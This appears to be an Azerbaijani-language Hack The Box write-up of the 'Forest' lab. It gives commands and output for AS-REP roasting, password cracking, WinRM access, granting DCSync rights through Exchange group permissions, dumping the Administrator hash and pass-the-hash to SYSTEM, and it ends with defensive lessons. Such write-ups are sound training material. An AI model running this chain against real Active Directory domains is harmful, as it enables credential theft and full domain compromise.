# Forest (HTB)

> Platforma: Hack The Box  
> OS: Windows  
> Çətinlik: Asan  
> Nəticə: root

---

## Hücum Zənciri

```text
Kəşfiyyat
├── nmap -p- --min-rate=5000 -T4 -Pn -n forest.htb → 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 47001, +high RPC ports
├── nmap -sC -sV → Microsoft DNS, Domain: htb.local, Host: FOREST, OS: Windows Server 2016 Standard 14393
└── /etc/hosts: 10.129.95.210 forest.htb htb.local FOREST.htb.local FOREST

İlkin Giriş (Anonim RPC -> AS-REP Roast -> WinRM)
├── rpcclient -U "" -N 10.129.95.210 -c "enumdomusers" → 31 domain users
├── impacket-GetNPUsers htb.local/ -dc-ip 10.129.95.210 -no-pass -usersfile users.txt -request → $krb5asrep$23$svc-alfresco@HTB.LOCAL
├── john asrep.hash --wordlist=rockyou.txt --format=krb5asrep → <PASSWORD>
└── evil-winrm -i 10.129.95.210 -u svc-alfresco -p <PASSWORD> → shell → user.txt

Autentifikasiyalı Sadalanma
├── whoami /groups → BUILTIN\Account Operators
├── netexec ldap 10.129.95.210 -u svc-alfresco -p <PASSWORD> --bloodhound --collection All
└── BloodHound: SVC-ALFRESCO → ACCOUNT OPERATORS --GenericAll--> EXCHANGE WINDOWS PERMISSIONS --WriteDacl--> HTB.LOCAL → DOMAIN ADMINS

Səlahiyyətlərin Artırılması (Exchange WriteDacl -> DCSync -> Pass-the-Hash)
├── net user john <PASSWORD> /add /domain
├── net group "Exchange Windows Permissions" john /add /domain
├── net localgroup "Remote Management Users" john /add
├── . .\powerview.ps1
├── Add-ObjectAcl -PrincipalIdentity john -Credential $cred -Rights DCSync
├── impacket-secretsdump htb.local/john:<PASSWORD>@10.129.95.210 -just-dc-user Administrator → NTLM hash
└── impacket-psexec -hashes <NTLM_HASH> Administrator@10.129.95.210 → SYSTEM → root.txt
```

> [!NOTE]
> Bütün bayraqlar, şifrələr, heşlər və sessiya tokenləri etik səbəblərə görə gizlədilmişdir.

---

## Maşın Brifinqi

Windows Server 2016 Standard (14393) Domain Controller (`FOREST`) `htb.local` domeni üçün. Port profili (53 DNS, 88 Kerberos, 389/3268 LDAP, 445 SMB, 464 kpasswd, 636 LDAPS, 3269 GC-LDAPS, 5985 WinRM, 9389 AD Web Services) - Active Directory-nin klassik imzasıdır. SMB signing aktiv və məcburidir - SMB relay mümkün deyil.

Bu maşın CVE tələb etməyən klassik Active Directory hücum zəncirini nümayiş etdirir: Kerberos pre-authentication söndürülmüş hesab (`svc-alfresco`) AS-REP Roast-a məruz qalır və offline qırılır; alınan kredlər `Account Operators` qrupuna aiddir, hansı ki `Exchange Windows Permissions` Exchange qrupu üzərində `GenericAll`-a malikdir; bu qrup domen obyekti üzərində `WriteDacl`-a malikdir, hansı ki `DCSync` hüquqlarını verməyə imkan verir; və `DCSync` `Administrator`-un NTLM heşini çıxarır. Zəncir tamamilə real korporativ AD mühitlərində Exchange quraşdırılmış halda geniş yayılmış konfiqurasiya xətaları üzərində qurulub.

---

## Kəşfiyyat

### Port Skanı

```bash
mkdir -p ~/Desktop/forest/scans; cd ~/Desktop/forest/scans
ports=$(nmap -p- --min-rate=5000 -T4 -Pn -n forest.htb -oG - | awk '/open/{for(i=4;i<=NF;i++){split($i,a,"/"); if(a[2]=="open") printf a[1]","}}' | sed 's/,$//')
nmap -sC -sV -Pn -n -p "$ports" forest.htb -oA scans/detail
```

**Nəticə (detail):**

```text
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: ...)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   Domain name: htb.local
|   Forest name: htb.local
|_  FQDN: FOREST.htb.local
```

Portların xülasəsi:

| Port  | Servis        | Qeydlər                                      |
|-------|---------------|----------------------------------------------|
| 53    | DNS           | Simple DNS Plus                              |
| 88    | Kerberos      | Windows Kerberos                             |
| 135   | MSRPC         | Windows RPC                                  |
| 139   | NetBIOS-SSN   | Legacy SMB                                   |
| 389   | LDAP          | Domain: htb.local                            |
| 445   | SMB           | Signing enabled and required                 |
| 464   | kpasswd5      | Kerberos password change                     |
| 593   | RPC over HTTP | ncacn_http                                   |
| 636   | LDAPS         | tcpwrapped                                   |
| 3268  | GC-LDAP       | Global Catalog LDAP                          |
| 3269  | GC-LDAPS      | tcpwrapped                                   |
| 5985  | WinRM         | Microsoft HTTPAPI - remote PowerShell        |
| 9389  | AD Web Svcs   | .NET Message Framing                         |
| 47001 | HTTP          | Microsoft HTTPAPI                             |

Hostu `/etc/hosts`-a əlavə edirik:

```bash
echo "10.129.95.210    forest.htb htb.local FOREST.htb.local FOREST" | sudo tee -a /etc/hosts
ping -c 2 htb.local
```

**Əsas müşahidə:** port dəsti (53, 88, 389, 445, 464, 636, 3268, 3269, 9389) Domain Controller-in kanonik imzasıdır. LDAP `Domain: htb.local`, SMB isə `Computer name: FOREST`, `FQDN: FOREST.htb.local` bildirir. Port **5985** (WinRM) açıqdır - etibarlı domen kredləri tapıldıqdan sonra ilkin shell üçün nəzərdə tutulub.

---

## İlkin Giriş (Anonim RPC -> AS-REP Roast -> WinRM)

### Anonim RPC Sadalanması

DC anonim RPC-yə (MS-RPC null session) icazə verir. Domen istifadəçilərini kredsiz sadalayırıq:

```bash
rpcclient -U "" -N 10.129.95.210 -c "enumdomusers"
```

**Nəticə:**

```text
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
...
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

**Əsas müşahidə:** `SM_*` və `HealthMailbox*` hesabları bu domendə Microsoft Exchange-in quraşdırıldığını təsdiqləyir. `svc-alfresco` hesabı `svc-` prefiksi ilə seçilir - servis hesabları üçün geniş yayılmış konvensiya. Servis hesablarında tez-tez Kerberos pre-authentication söndürülmüş olur ki, bu da AS-REP Roasting üçün şərtdir.

### AS-REP Roasting

İstifadəçi siyahısını yadda saxlayırıq və hər istifadəçi üçün AS-REP (TGT) tələb edirik. Yalnız `UF_DONT_REQUIRE_PREAUTH` olan hesablar heş qaytaracaq:

```bash
rpcclient -U "" -N 10.129.95.210 -c "enumdomusers" | grep -oP 'user:\[\K[^\]]+' > users.txt
wc -l users.txt

impacket-GetNPUsers htb.local/ -dc-ip 10.129.95.210 -no-pass -usersfile users.txt -request -format hashcat -outputfile asrep.hash
```

**Nəticə:**

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
...
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:<KRB5ASREP_HASH_PART>$f475...
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

**Əsas müşahidə:** yalnız `svc-alfresco` Kerberos AS-REP heşini qaytardı. Bu o deməkdir ki, hesabda Kerberos pre-authentication söndürülmüşdür (`UF_DONT_REQUIRE_PREAUTH` bayrağı), bu da hər kəsə hesabın NTLM heşi ilə şifrələnmiş TGT tələb etməyə və onu offline qırmağa imkan verir.

### AS-REP Heşinin Qırılması

Heş formatı `$krb5asrep$23$...` (etype 23, RC4-HMAC), John the Ripper və ya hashcat (rejim 18200) ilə qırılır:

```bash
john asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep
```

**Nəticə:**

```text
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<PASSWORD>          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:01 DONE (2026-10-14 02:50) 0.5917g/s 2417Kp/s 2417Kc/s 2417KC/s s4ls469..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Kredlər əldə edildi: `htb.local\svc-alfresco : <PASSWORD>`.

### WinRM ilkin girişi

Port 5985 (WinRM) açıqdır. Alınan kredlərlə `evil-winrm` istifadə edirik:

```bash
evil-winrm -i 10.129.95.210 -u svc-alfresco -p '<PASSWORD>'
```

**Nəticə:**

```text
Evil-WinRM shell v4.1
Info: Establishing connection to remote endpoint
Info: Connection successful
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

Şəxsiyyəti təsdiqləyirik və user bayrağını götürürük:

```powershell
whoami
hostname
type C:\Users\svc-alfresco\Desktop\user.txt
```

**Nəticə:**

```text
htb\svc-alfresco
FOREST
<USER_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Autentifikasiyalı Sadalanma

### Qrup Üzvlüyü

`svc-alfresco`-nun hansı qruplara aid olduğunu, o cümlədən iç-içə üzvlükləri yoxlayırıq:

```powershell
whoami /groups
```

**Nəticə (müvafiq fraqment):**

```text
Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
```

**Əsas müşahidə:** `svc-alfresco` `BUILTIN\Account Operators`-in üzvüdür. Bu, üzvləri adi domen istifadəçilərini və qruplarını yarada və dəyişdirə bilən imtiyazlı daxili qrupdur. Qorunan qrupları (`Domain Admins`, `Administrators` və s.) dəyişə bilməz, lakin qorunmayan qrupları dəyişə bilər - bu da Exchange qrupları vasitəsilə pivot üçün kifayətdir.

### BloodHound Məlumatlarının Toplanması

Qraf analizi üçün Active Directory məlumatlarını toplayırıq. `bloodhound-python` kollektoru bu DC-də uğursuz olur, çünki LDAP signing tələb olunur (Python kollektoru signing xətasından sonra LDAP kontekstini itirən fallback istifadə edir). NetExec, fərqli kod yolu istifadə edərək, işləyir:

```bash
netexec ldap 10.129.95.210 -u svc-alfresco -p '<PASSWORD>' --bloodhound --collection All --dns-server 10.129.95.210
```

**Nəticə:**

```text
LDAP  10.129.95.210  389  FOREST  [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert)
LDAP  10.129.95.210  389  FOREST  [+] htb.local\svc-alfresco:<PASSWORD>
LDAP  10.129.95.210  389  FOREST  Resolved collection methods: rdp, trusts, localadmin, psremote, group, objectprops, session, acl, container, dcom
LDAP  10.129.95.210  389  FOREST  Done in 1M 42S
LDAP  10.129.95.210  389  FOREST  Compressing output into /home/kali/.nxc/logs/FOREST_10.129.95.210_2026-10-14_030646_bloodhound.zip
```

Alınan zip-i BloodHound CE-yə yükləyirik və `SVC-ALFRESCO@HTB.LOCAL`-i **Owned** kimi işarələyirik.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Domain Admins-ə Ən Qısa Yol

Owned kimi işarələnmiş `SVC-ALFRESCO` ilə `DOMAIN ADMINS@HTB.LOCAL`-ə ən qısa yolu soruşuruq:

**Nəticə (BloodHound qrafı):**

```text
SVC-ALFRESCO@HTB.LOCAL
  │ MemberOf
  ▼
SERVICE ACCOUNTS@HTB.LOCAL
  │ MemberOf
  ▼
PRIVILEGED IT ACCOUNTS@HTB.LOCAL
  │ MemberOf
  ▼
ACCOUNT OPERATORS@HTB.LOCAL ──GenericAll──► EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
                                                   │ WriteDacl
                                                   ▼
                                            HTB.LOCAL (domain object)
                                                   │ Contains
                                                   ▼
                                            USERS@HTB.LOCAL
                                                   │ Contains
                                                   ▼
                                            DOMAIN ADMINS@HTB.LOCAL
```

**Əsas müşahidə:** yol tamamilə üç faktla izah olunur:

1. `SVC-ALFRESCO` tranzitiv olaraq `ACCOUNT OPERATORS`-in üzvüdür.
2. `ACCOUNT OPERATORS` `EXCHANGE WINDOWS PERMISSIONS` qrupu üzərində `GenericAll`-a malikdir. `GenericAll` - tam nəzarətdir, qrup üzvlüyünü dəyişməyə imkan verir.
3. `EXCHANGE WINDOWS PERMISSIONS` domen obyekti `HTB.LOCAL` üzərində `WriteDacl`-a malikdir. `WriteDacl` obyektin ACL-ini dəyişməyə imkan verir - yəni hər kəsə `DCSync` genişləndirilmiş hüququnu vermək.

Qalan kənar (`HTB.LOCAL` -Contains-> `USERS` -Contains-> `DOMAIN ADMINS`) standart AD iyerarxiyasıdır; domen obyekti üzərində `DCSync`-in nə üçün Domain Admin heşlərini verdiyini göstərir.

Bu, Microsoft Exchange quraşdırıldıqda standart olaraq yaranan `Exchange Windows Permissions` konfiqurasiya xətasıdır (ictimai olaraq **CVE-2019-0724 / PrivExchange** kimi izlənilir). `Account Operators`-in bu qrup üzərində `GenericAll`-a malik olması - pivot nöqtəsidir.

---

## İstismar

No CVE (misconfiguration) - `svc-alfresco` hesabında Kerberos pre-authentication söndürülmüşdür (`UF_DONT_REQUIRE_PREAUTH`), bu da hər hansı autentifikasiya olunmamış istifadəçiyə hesabın NTLM heşi ilə şifrələnmiş AS-REP (TGT) tələb etməyə və onu offline qırmağa imkan verir.

No CVE (design weakness) - `ACCOUNT OPERATORS` `EXCHANGE WINDOWS PERMISSIONS` üzərində `GenericAll`-a, o isə domen obyekti `HTB.LOCAL` üzərində `WriteDacl`-a malikdir. Hər iki fakt Exchange-in standart quraşdırılmasından irəli gəlir və ictimai olaraq **CVE-2019-0724 (PrivExchange)** kimi sənədləşdirilmişdir. Zəncir eksployt kod tələb etmir - yalnız AD idarəetmə primitivlərini (`net group`, `Add-ObjectAcl`, `secretsdump`).

---

## Səlahiyyətlərin Artırılması (Exchange WriteDacl -> DCSync -> Pass-the-Hash)

### Pivot İstifadəçisinin Yaradılması

`Account Operators` üzvləri domen istifadəçiləri yarada bilər. Pivot üçün lazım olan iki qrupa yeni istifadəçi `john` yaradırıq:

```powershell
net user john <PASSWORD> /add /domain
net group "Exchange Windows Permissions" john /add /domain
net localgroup "Remote Management Users" john /add
```

**Nəticə:**

```text
The command completed successfully.
The command completed successfully.
The command completed successfully.
```

**Əsas müşahidə:** ikinci əmr pivotdur. `svc-alfresco` (`Account Operators` + `GenericAll` vasitəsilə) `john`-u `Exchange Windows Permissions`-ə əlavə edə bilər. Bu qrup domen obyekti üzərində `WriteDacl`-a malikdir - deməli, `john` indi bu imkanı miras alır. `Remote Management Users` WinRM girişi üçün əlavə olunur.

### DCSync Hüquqlarının Verilməsi

Hədəfə PowerView yükləyirik və ondan istifadə edərək `john`-a domen obyekti üzərində `DCSync` genişləndirilmiş hüququnu veririk:

```powershell
upload /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1

. .\powerview.ps1

$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\john', $pass)

Add-ObjectAcl -PrincipalIdentity john -Credential $cred -Rights DCSync -Verbose
```

**Nəticə (müvafiq sətirlər):**

```text
Verbose: [Add-DomainObjectAcl] Granting principal CN=john,CN=Users,DC=htb,DC=local 'DCSync' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=john,CN=Users,DC=htb,DC=local rights GUID '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=john,CN=Users,DC=htb,DC=local rights GUID '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=john,CN=Users,DC=htb,DC=local rights GUID '89e95b76-444d-4c62-991a-0facbeda640c' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Error granting principal ... 'DCSync' on CN=Users,DC=htb,DC=local : Exception calling "CommitChanges" with "0" argument(s): "Access is denied."
... (repeats for many child objects)
```

**Əsas müşahidə:** `DC=htb,DC=local` üzərində üç "Granting" sətri - ən vacibləridir. Onlar aşağıdakılara uyğundur:
- `1131f6aa-...` = `DS-Replication-Get-Changes`
- `1131f6ad-...` = `DS-Replication-Get-Changes-All`
- `89e95b76-...` = `DS-Replication-Get-Changes-In-Filtered-Set`

`Add-ObjectAcl` domendəki **bütün** obyektləri gəzir və `Access is denied` sətirləri gözləniləndir: `john` (`Exchange Windows Permissions` / domen obyekti üzərində `WriteDacl` vasitəsilə) yalnız **domen kökü** üzərində ACL dəyişmə hüququna malikdir, `Domain Admins` və ya `Administrator` kimi övlad obyektləri üzərində deyil. Domen kökündəki grantlar DCSync üçün kifayətdir.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### DCSync

`DCSync` hüquqları ilə `john` kimi `impacket-secretsdump` işə salırıq ki, `Administrator`-un NTLM heşini çıxaraq:

```bash
impacket-secretsdump 'htb.local/john:<PASSWORD>@10.129.95.210' -just-dc-user Administrator
```

**Nəticə:**

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:<LM_HASH_EMPTY>:<NTLM_HASH>:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:<AES256_KEY>
htb.local\Administrator:aes128-cts-hmac-sha1-96:<AES128_KEY>
htb.local\Administrator:des-cbc-md5:<DES_KEY>
[*] Cleaning up...
```

**Əsas müşahidə:** `impacket-secretsdump` `DRSUAPI` (Directory Replication Service Remote Protocol) istifadə edir ki, özünü domen nəzarətçisi kimi təqdim edib `NTDS.DIT` sirlərini çıxarsın. Kritik dəyər - `Administrator`-un NTLM heşi: `<NTLM_HASH>`.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Pass-the-Hash

NTLM heşini `impacket-psexec` ilə istifadə edirik (Pass-the-Hash - plaintext parol tələb olunmur):

```bash
impacket-psexec -hashes '<LM_HASH>:<NTLM_HASH>' Administrator@10.129.95.210
```

**Nəticə:**

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.129.95.210.....
[*] Found writable share ADMIN$
[*] Uploading file WuyqqSXb.exe
[*] Opening SVCManager on 10.129.95.210.....
[*] Creating service CwwI on 10.129.95.210.....
[*] Starting service CwwI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
<ROOT_FLAG>
```

**Əsas müşahidə:** `psexec` `ADMIN$`-a servis binary-si yükləyir, onu Windows xidməti kimi qeydiyyata alır və işə salır. Xidmət `NT AUTHORITY\SYSTEM` kimi işləyir - maşında ən yüksək imtiyaz səviyyəsi. NTLM heşi birbaşa istifadə olunur (Pass-the-Hash); `Administrator`-un plaintext parolu heç vaxt bərpa olunmadı.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Bayraqlar

| Bayraq | Dəyər       |
|--------|-------------|
| User   | <USER_FLAG> |
| Root   | <ROOT_FLAG> |

---

## Əsas Nəticələr

- **AS-REP Roasting yalnız bir səhv konfiqurasiya edilmiş hesab tələb edir.** `UF_DONT_REQUIRE_PREAUTH` təyin edilmiş servis hesabı autentifikasiya olunmamış hücumçuya TGT tələb etməyə və onu offline qırmağa imkan verir. Müdafiə sadədir: Kerberos pre-authentication-i söndürməyin, əgər servis bunu tələb edirsə - uzun, təsadüfi yaradılmış parol istifadə edin.

- **`Account Operators` ikinci dərəcəli qrup deyil.** Üzvləri adi istifadəçiləri və qrupları yarada və dəyişə bilər və bu, qorunmayan Exchange qrupları vasitəsilə pivot üçün kifayətdir. `Account Operators`-dəki hər hansı hesabı audit edin və ona foothold ekvivalenti imtiyaz səviyyəsi kimi yanaşın, aşağı imtiyazlı rol kimi deyil.

- **`Exchange Windows Permissions` domen üzərində standart olaraq `WriteDacl`-a malikdir.** Bu, Exchange quraşdırılmasından yaranan geniş bilinən konfiqurasiya xətasıdır (**CVE-2019-0724 / PrivExchange** kimi sənədləşdirilib). `WriteDacl` hüququ domen obyektinin ACL-ini dəyişməyə imkan verir - və özünə `DCSync` verməyə. Microsoft-un tövsiyə etdiyi düzəliş - Exchange quraşdırıldıqdan sonra domen obyektində `Exchange Windows Permissions`-dən `WriteDacl` ACE-ni silməkdir.

- **DCSync eksployt deyil, leqal replikasiya protokoludur.** `impacket-secretsdump` `DRSUAPI` istifadə edir (domen nəzarətçilərinin bir-biri ilə replikasiya üçün istifadə etdiyi həmin protokol). DCSync-i qarşısını almaq - domen obyektində `DS-Replication-Get-Changes` və `DS-Replication-Get-Changes-All` hüquqlarına sahib olanları məhdudlaşdırmaq deməkdir - standart olaraq bunlar yalnız `Domain Admins`, `Enterprise Admins`, `Administrators` və DC maşın hesablarıdır.

- **Pass-the-Hash plaintext parol ehtiyacını aradan qaldırır.** `Administrator`-un NTLM heşi DCSync vasitəsilə alındıqdan sonra onu birbaşa `impacket-psexec`, `impacket-wmiexec`, `crackmapexec`/`netexec` və ya `evil-winrm --hash` ilə istifadə etmək olar. PtH-in qarşısını yalnız hədəf hesabın parolunu rotasiya etməklə (və ya NTLM autentifikasiyasını tamamilə söndürməklə) almaq olar.

- **BloodHound vizuallaşdırması çoxaddımlı AD zəncirini bir şəkilə çevirir.** `SVC-ALFRESCO -> ACCOUNT OPERATORS -> EXCHANGE WINDOWS PERMISSIONS -> HTB.LOCAL -> DOMAIN ADMINS` qrafı - bütün səlahiyyət artırma yoludur. Qraf olmadan həmin yol onlarla obyekt üzərində əl ilə ACL sadalanması tələb edərdi.

- **`bloodhound-python` və NetExec fərqli LDAP kod yolları istifadə edir.** Standalone `bloodhound-python` kollektoru bu DC-də LDAP signing səbəbindən uğursuz oldu; NetExec-in daxili kollektoru (`netexec ldap ... --bloodhound`) işlədi, çünki signing/channel-binding negotiation-u fərqli emal edir. Hər ikisi OSCP-də bərabər dərəcədə etibarlıdır; bu failure-mode-un mövcud olduğunu bilin və kollektoru dəyişməyə hazır olun.

- **Nə CVE, nə eksployt kodu.** Bütün zəncir AD idarəetməsinin daxili primitivlərindən istifadə edir (`net user`, `net group`, `Add-ObjectAcl`, `impacket-secretsdump`). Bu, Active Directory hücumlarının müasir formasıdır: problem `lsass.exe`-də yaddaş zədələnməsi deyil - quraşdırma zamanı verilmiş və heç vaxt audit edilməmiş icazələrin kumulyativ effektidir.